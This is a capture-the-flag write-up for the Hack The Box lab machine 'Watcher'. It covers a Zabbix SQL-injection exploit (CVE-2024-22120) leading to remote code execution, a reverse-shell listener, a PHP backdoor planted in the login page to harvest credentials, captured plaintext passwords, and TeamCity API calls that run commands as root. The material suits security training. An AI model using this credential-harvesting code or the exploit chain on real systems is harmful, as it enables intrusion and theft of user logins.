# Watcher - HTB Machine Writeup

## Overview

Watcher is a machine running Zabbix (a network monitoring tool) with a vulnerable version susceptible to CVE-2024-22120, a SQL injection that lets you steal an admin session and get remote code execution. From there, we find TeamCity (a CI/CD build server) running as root on localhost, log in with credentials found during enumeration, and abuse its build system to execute commands as root.

## Recon

Standard nmap stuff reveals a Zabbix instance at `zabbix.watcher.vl` with the web frontend on port 80 and the Zabbix server trapper on port 10051. SSH is also open on 22.

## Foothold - CVE-2024-22120 (Zabbix SQLi to RCE)

### Grabbing a Guest Session

The Zabbix frontend allows guest access. By logging in as guest and grabbing the session cookie, we get a low-privilege session ID we can use for the exploit. The cookie value is base64-encoded JSON:

```bash
echo eyJzZXNzaW9uaWQiOiI2NmQ3NzE5MzVhYTA4N2NmYmI1MjE4NzZjZWM2MGYzYSIsInNlcnZlckNoZWNrUmVzdWx0Ijp0cnVlLCJzZXJ2ZXJDaGVja1RpbWUiOjE3NzAwOTM1NzMsInNpZ24iOiJlNDBmOWI4MmUwZGQ4Mzg4Nzc5NzY0MTY1NDYwM2FkYzQ3NDcxODY1YTA0ZGM5YTRiNTcyNDQ5ZjA5YWIwNTk1In0= | base64 -d
```

Which decodes to:

```json
{
  "sessionid": "66d771935aa087cfbb521876cec60f3a",
  "serverCheckResult": true,
  "serverCheckTime": 1770093573,
  "sign": "e40f9b82e0dd83887797641654603adc47471865a04dc9a4b572449f09ab0595"
}
```

The `sessionid` field is what we need - a valid low-privilege session ID.

### Running the Exploit (and Fixing It)

CVE-2024-22120 is a time-based blind SQL injection in the Zabbix server's audit log functionality. The exploit connects to the Zabbix trapper port (10051) and uses a crafted `clientip` field to inject SQL that extracts the admin session ID one character at a time via sleep-based timing.

First attempt:

```bash
python3 CVE-2024-22120-RCE.py --ip 10.129.10.144 --sid 66d771935aa087cfbb521876cec60f3a --hostid 10084
```

The SQLi extraction ran and printed:

```
(!) sessionid=e29cc8d946f1a3135fe7ceec60d0ff0d1a3135fe7ceec60d0ff0d
```

Then it immediately crashed:

```
KeyError: 'result'
```

**What went wrong:** The exploit script had a display bug. It prints progress using `\r` (carriage return) which overwrites the current line but doesn't clear leftover characters. The progress line was longer than the final output line, so garbage characters from the previous print remained visible on screen. The "extracted" session ID looked like it was 53 characters, but the real admin session ID was only the first 32: `e29cc8d946f1a3135fe7ceec60d0ff0d`. The trailing `1a3135fe7ceec60d0ff0d` was just a visual artifact - you can verify it's literally a substring of the real session ID that bled through from the progress display.

Passing a 53-character auth token to the Zabbix API obviously fails - the API returns an error instead of a result, and the script crashes because it doesn't handle errors at all.

**Fixes applied to the exploit script:**

1. Added trailing spaces to the final print to clear leftover carriage return garbage
2. Added error handling in `CreateScript()` so API errors get printed instead of crashing
3. Removed duplicate code at the bottom of the script that would re-run everything a second time

With the correct 32-character session ID, the RCE portion works:

```bash
python3 CVE-2024-22120-RCE.py --ip zabbix.watcher.vl --hostid 10084 \
  --admin-sid e29cc8d946f1a3135fe7ceec60d0ff0d
```

This creates a Zabbix script via the API, executes it on the host, and gives us a command shell as the `zabbix` user.

### Getting a Proper Shell

From the Zabbix RCE shell, we set up a reverse shell:

```bash
nc -lvnp 1337  # on attacker
```

Then upgrade it with the usual trick:

```bash
stty raw -echo; fg
export TERM=xterm
```

## User Flag

The user flag is sitting right in the filesystem root:

```bash
cat /user.txt
```

> `HTB{REDACTED}`

## Privilege Escalation - Zabbix to Root via TeamCity

### Enumeration

Checking what's running on the box:

```bash
ps aux --sort=-rss | head -20
ss -tlnp
```

Key findings:
- **TeamCity 2024.03.3** is running as **root** on `127.0.0.1:8111`
- A TeamCity build agent is also running as root
- MySQL is running locally with the Zabbix database

The Zabbix server config at `/usr/local/etc/zabbix_server.conf` contains database credentials:

```
DBUser=zabbix
DBPassword=uIy@YyshSuyW%0_puSqA
```

These don't work for root or the ubuntu user (no password reuse), but they confirm MySQL access to the Zabbix database.

### Getting Admin Access to the Zabbix UI

At this point we have a shell as `zabbix` but we want to poke around the Zabbix web UI as admin too. The CVE-2024-22120 exploit POC includes a second script, `CVE-2024-22120-LoginAsAdmin.py`, which does a similar time-based SQLi but extracts both the admin session ID *and* the session signing key, then builds a valid admin cookie for you.

After commenting out the hardcoded proxy settings in the script (it expects a proxy on port 8083 by default), we run it:

```bash
python3 CVE-2024-22120-LoginAsAdmin.py --ip zabbix.watcher.vl \
  --sid 66d771935aa087cfbb521876cec60f3a --hostid 10084
```

This takes a while (it's extracting two 32-character hex strings one character at a time via sleep-based timing), but eventually spits out a full `zbx_session` cookie. Replacing our browser cookie with that value gets us into the Zabbix UI as Admin.

### Resetting the Admin Password via MySQL

Since we already have the Zabbix database credentials, there's actually an easier way to get admin UI access. The [Zabbix docs](https://www.zabbix.com/documentation/current/en/manual/appendix/install/db_scripts) show how to reset the admin password to "zabbix" with a single query:

```sql
UPDATE users SET passwd = '$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username = 'Admin';
```

Running that through our shell:

```bash
mysql -u zabbix -p'uIy@YyshSuyW%0_puSqA' zabbix -e \
  "UPDATE users SET passwd = '\$2a\$10\$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username = 'Admin';"
```

Now we can log into Zabbix as `Admin` / `zabbix` through the web UI (note: the username is case-sensitive - it's "Admin" not "admin").

### Catching Frank's Credentials via Login Page Poisoning

Poking around the Zabbix audit logs as admin, we notice something interesting: a user named **Frank** is logging in every single minute. Like clockwork. That screams "automated script with hardcoded credentials."

The plan: backdoor the Zabbix login page to capture credentials as users log in, then wait for Frank's next automated login.

The Zabbix login logic lives in `/usr/share/zabbix/index.php`, around line 70:

```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
```

We back up the original and add a few lines right after the login check to log credentials to a file:

```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
        $user = $_POST['name'] ?? '??';
        $password = $_POST['password'] ?? '??';
        $f = fopen('/dev/shm/creds.txt', 'a+');
        fputs($f, "{$user}:{$password}\n");
        fclose($f);
```

We edit this locally, serve it with a Python HTTP server, and pull it down on the target:

```bash
zabbix@watcher:/usr/share/zabbix$ cp index.php{,.bak}
zabbix@watcher:/usr/share/zabbix$ curl 10.10.15.1/index.php -o index.php
```

The login page works exactly the same as before for anyone using it - they'd never notice - but now every login attempt gets recorded to `/dev/shm/creds.txt`. Within a minute, Frank's automated login fires and we have what we need:

```bash
zabbix@watcher:/usr/share/zabbix$ cat /dev/shm/creds.txt
Frank:R%)3S7^Hf4TBobb(gVVs
```

### Getting into TeamCity

TeamCity is only listening on localhost, so we interact with it through our shell on the box. The known auth bypass CVEs (CVE-2024-27198/27199) don't apply here since those were patched before version 2024.03.

We try Frank's captured credentials against TeamCity and they work:

```
Frank:R%)3S7^Hf4TBobb(gVVs
```

Quick verification that the creds work and Frank is an admin:

```bash
curl -s 'http://127.0.0.1:8111/httpAuth/app/rest/users/current' \
  -u 'Frank:R%)3S7^Hf4TBobb(gVVs)' \
  -H 'Accept: application/json'
```

Frank has the `SYSTEM_ADMIN` role. Since the build agent runs as root, we can execute arbitrary commands as root through TeamCity build steps.

### RCE as Root via TeamCity Build

Using the TeamCity REST API, we:

1. **Create a project** (can't put build configs in the Root project):

```bash
curl -s -X POST 'http://127.0.0.1:8111/httpAuth/app/rest/projects' \
  -u 'Frank:R%)3S7^Hf4TBobb(gVVs' \
  -H 'Content-Type: application/xml' \
  -d '<newProjectDescription name="pwn" id="pwn">
        <parentProject locator="id:_Root"/>
      </newProjectDescription>'
```

2. **Create a build configuration**:

```bash
curl -s -X POST 'http://127.0.0.1:8111/httpAuth/app/rest/projects/pwn/buildTypes' \
  -u 'Frank:R%)3S7^Hf4TBobb(gVVs' \
  -H 'Content-Type: application/xml' \
  -d '<newBuildTypeDescription name="rce" id="rce">
        <project id="pwn"/>
      </newBuildTypeDescription>'
```

3. **Add a command-line build step**:

```bash
curl -s -X POST 'http://127.0.0.1:8111/httpAuth/app/rest/buildTypes/id:rce/steps' \
  -u 'Frank:R%)3S7^Hf4TBobb(gVVs' \
  -H 'Content-Type: application/xml' \
  -d '<step name="cmd" type="simpleRunner">
        <properties>
          <property name="script.content" value="cat /root/root.txt"/>
          <property name="teamcity.step.mode" value="default"/>
          <property name="use.custom.script" value="true"/>
        </properties>
      </step>'
```

4. **Trigger the build**:

```bash
curl -s -X POST 'http://127.0.0.1:8111/httpAuth/app/rest/buildQueue' \
  -u 'Frank:R%)3S7^Hf4TBobb(gVVs' \
  -H 'Content-Type: application/xml' \
  -d '<build><buildType id="rce"/></build>'
```

5. **Read the build log** to get the output:

```bash
curl -s 'http://127.0.0.1:8111/httpAuth/downloadBuildLog.html?buildId=101' \
  -u 'Frank:R%)3S7^Hf4TBobb(gVVs'
```

The build runs as root, executes our command, and the flag appears in the build log.

## Root Flag

> `HTB{REDACTED}`

## Attack Chain Summary

```
Guest session cookie (base64 decode)
        |
        v
CVE-2024-22120: SQLi via Zabbix trapper (port 10051)
        |
        v
Extract admin session ID (time-based blind SQLi)
        |
        v
Zabbix API RCE as 'zabbix' user (script.create + script.execute)
        |
        v
Enumerate box -> find TeamCity 2024.03.3 running as root on localhost:8111
        |
        v
Reset Zabbix admin password via MySQL -> access Zabbix UI as Admin
        |
        v
Notice Frank logging in every minute via audit logs
        |
        v
Poison Zabbix login page (index.php) to capture credentials
        |
        v
Harvest Frank's creds -> authenticate to TeamCity (SYSTEM_ADMIN)
        |
        v
Create build config with command-line step via REST API
        |
        v
Build agent executes as root -> read /root/root.txt
```

## Lessons Learned

- **Always decode cookies** - the guest session cookie had the session ID we needed right there in base64.
- **Watch out for terminal display bugs** - the carriage return issue in the exploit script wasted time by making us pass a corrupted session ID. When something looks off, count the characters.
- **Check the audit logs** - Frank's every-minute logins were a dead giveaway that something automated was running with hardcoded creds. Audit logs tell you who's active and how often.
- **Login page poisoning is underrated** - if you can write to the web root, you can silently harvest credentials from anyone who logs in. Simple, effective, hard to detect.
- **Internal services matter** - TeamCity was only on localhost but running as root. Once you have any shell on the box, internal services become your next target.
- **CI/CD as root is a bad idea** - TeamCity and its build agent should never run as root. A dedicated service account with minimal privileges would have prevented this entire privesc path.
- **Don't reuse credentials across services** - Frank used the same password for Zabbix and TeamCity. One compromised service gave us the keys to the next.
